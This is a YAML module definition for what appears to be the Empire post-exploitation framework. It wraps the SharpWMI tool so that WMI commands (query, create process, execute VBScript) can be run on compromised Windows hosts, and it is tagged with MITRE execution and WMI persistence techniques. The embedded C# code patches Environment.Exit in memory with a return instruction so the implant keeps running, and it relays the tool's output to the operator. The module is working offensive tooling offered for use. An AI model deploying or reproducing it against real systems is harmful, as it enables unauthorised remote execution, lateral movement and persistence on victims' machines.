name: SharpWMI
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: Use a SharpWMI command.
software: ''
tactics: [TA0002]
techniques: [T1047, T1546.003]
background: true
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: Command
    description: SharpWMI command to execute.
    required: false
    value: action=query
    strict: false
    suggested_values:
      - action=query
      - action=create
      - action=executevbs
csharp:
  UnsafeCompile: true
  CompatibleDotNetVersions:
    - Net35
    - Net40
  Code: |
    using System;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Collections.Generic;
    using System.Reflection;
    using System.Text;
    using System.Linq;
    using System.Text.RegularExpressions;
    using SharpSC;

    public static class Program
    {
        private static byte originalByte;

        public static Stream OutputStream { get; set; }

        public static void Main(string[] args)
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                TextWriter originalOutput = Console.Out;
                TextWriter originalError = Console.Error;

                StreamWriter outputStreamWriter = null;
                if (OutputStream != null)
                {
                    outputStreamWriter = new StreamWriter(OutputStream);
                    outputStreamWriter.AutoFlush = true;
                }

                PatchEnvironmentExit();

                try
                {
                    MultiTextWriter multiWriter = new MultiTextWriter(stringWriter, outputStreamWriter);
                    Console.SetOut(multiWriter);
                    Console.SetError(multiWriter);

                    string allArgs = string.Join(" ", args);
                    string[] splitArgs = Regex.Matches(allArgs, @"[^\s""=]+=""[^""]*""|[^\s""=]+=[^\s]+")
                                              .Cast<Match>()
                                              .Select(m => m.Value.Replace("= ", "="))  // Fix any accidental spaces after `=`
                                              .ToArray();

                    for (int i = 0; i < splitArgs.Length; i++)
                    {
                        if (splitArgs[i].StartsWith("query="))
                        {
                            splitArgs[i] = splitArgs[i].Replace("\"", "");
                        }
                    }

                    foreach (string arg in splitArgs)
                    {
                        Console.WriteLine($"[>] Argument: {arg}");
                    }

                    typeof(SharpWMI.Program).GetMethod("Main", BindingFlags.NonPublic | BindingFlags.Static)
                                   .Invoke(null, new object[] { splitArgs });
                }
                catch (Exception ex)
                {
                    stringWriter.WriteLine($"Error: {ex.Message}");
                    if (ex.InnerException != null)
                    {
                        stringWriter.WriteLine($"Inner Exception: {ex.InnerException.GetType().FullName}: {ex.InnerException.Message}");
                    }
                }
                finally
                {
                    Console.SetOut(originalOutput);
                    Console.SetError(originalError);

                    if (outputStreamWriter != null)
                    {
                        outputStreamWriter.Flush();
                        outputStreamWriter.Close();
                    }
                    Console.WriteLine(stringWriter.ToString());
                }
            }
        }

        private class MultiTextWriter : TextWriter
        {
            private readonly TextWriter _writer1;
            private readonly TextWriter _writer2;

            public MultiTextWriter(TextWriter writer1, TextWriter writer2)
            {
                _writer1 = writer1;
                _writer2 = writer2;
            }

            public override Encoding Encoding
            {
                get
                {
                    return _writer1?.Encoding ?? Encoding.UTF8;
                }
            }

            public override void Write(char value)
            {
                _writer1?.Write(value);
                _writer2?.Write(value);
            }

            public override void Write(string value)
            {
                _writer1?.Write(value);
                _writer2?.Write(value);
            }

            public override void Flush()
            {
                _writer1?.Flush();
                _writer2?.Flush();
            }
        }

        private static void PatchEnvironmentExit()
        {
            var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
            var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");

            RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
            var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();

            unsafe
            {
                IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();

                MEMORY_BASIC_INFORMATION mbi;

                if (VirtualQueryEx((IntPtr)(-1), target, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if (mbi.Protect == (uint)AllocationProtectEnum.PAGE_EXECUTE_READ)
                    {
                        uint flOldProtect;

                        if (VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, (uint)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out flOldProtect))
                        {
                            originalByte = *(byte*)target;
                            *(byte*)target = 0xc3;

                            VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, flOldProtect, out flOldProtect);
                        }
                    }
                }
            }
        }

        private static void UnpatchEnvironmentExit()
        {
            var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
            var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");

            RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
            var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();

            unsafe
            {
                IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();

                MEMORY_BASIC_INFORMATION mbi;

                if (VirtualQueryEx((IntPtr)(-1), target, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if (mbi.Protect == (uint)AllocationProtectEnum.PAGE_EXECUTE_READ)
                    {
                        uint flOldProtect;

                        if (VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, (uint)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out flOldProtect))
                        {
                            *(byte*)target = originalByte;

                            VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, flOldProtect, out flOldProtect);
                        }
                    }
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
    }
  ReferenceSourceLibraries:
    - Name: SharpWMI
      Description: SharpWMI is a C# implementation of various WMI functionality.
      Location: SharpWMI\
      Language: CSharp
      CompatibleDotNetVersions:
        - Net35
        - Net40
      ReferenceAssemblies:
        - Name: System.Management.dll
          Location: net40\System.Management.dll
          DotNetVersion: Net40
        - Name: System.dll
          Location: net40\System.dll
          DotNetVersion: Net40
        - Name: System.Core.dll
          Location: net40\System.Core.dll
          DotNetVersion: Net40
        - Name: mscorlib.dll
          Location: net40\mscorlib.dll
          DotNetVersion: Net40
        - Name: System.Management.dll
          Location: net35\System.Management.dll
          DotNetVersion: Net35
        - Name: mscorlib.dll
          Location: net35\mscorlib.dll
          DotNetVersion: Net35
        - Name: System.Core.dll
          Location: net35\System.Core.dll
          DotNetVersion: Net35
        - Name: System.dll
          Location: net35\System.dll
          DotNetVersion: Net35
      EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
